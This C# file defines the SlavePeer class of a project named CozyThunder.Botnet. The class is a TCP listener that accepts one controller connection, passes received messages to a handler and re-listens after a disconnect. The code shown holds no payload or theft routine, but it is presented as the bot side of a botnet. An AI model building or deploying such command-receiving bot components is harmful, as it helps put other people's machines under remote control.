using CozyThunder.Botnet.Common;
using CozyThunder.Botnet.Interface;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace CozyThunder.Botnet.Slave
{
    public class SlavePeer : Peer, ISlavePeer
    {
        ISlavePeerListener listener_;
        TcpListener socket_;

        void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                TcpListener listener = (TcpListener)ar.AsyncState;
                Socket client = listener.EndAcceptSocket(ar);

                listener_?.OnConnect(client.RemoteEndPoint.ToString());
                StateObject state = new StateObject();
                state.workSocket = client;
                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
            catch { }
        }

        void ReadCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;
            try
            {
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead > 0)
                {
                    state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));
                    String content = state.sb.ToString();
                    listener_?.OnMessage(content);
                }
                handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
            catch
            {
                socket_.Stop();
                socket_ = new TcpListener(EndPoint);
                socket_.Start(1);
                socket_.BeginAcceptSocket(AcceptCallback, socket_);

                listener_?.OnDisConnect();
            }
        }

        void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket handler = (Socket)ar.AsyncState;
                int bytesSent = handler.EndSend(ar);
            }
            catch {}
        }

        void Send(Socket handler, String data)
        {
            byte[] byteData = Encoding.ASCII.GetBytes(data);
            handler.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), handler);
        }

        public bool Start(string ip, int port, ISlavePeerListener listener)
        {
            listener_ = listener;
            EndPoint = new IPEndPoint(IPAddress.Parse(ip), port);

            try
            {
                socket_ = new TcpListener(EndPoint);
                socket_.Start(1);
                socket_.BeginAcceptSocket(AcceptCallback, socket_);
            }
            catch (SocketException)
            {
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            socket_.Stop();
            return true;
        }
    }
}
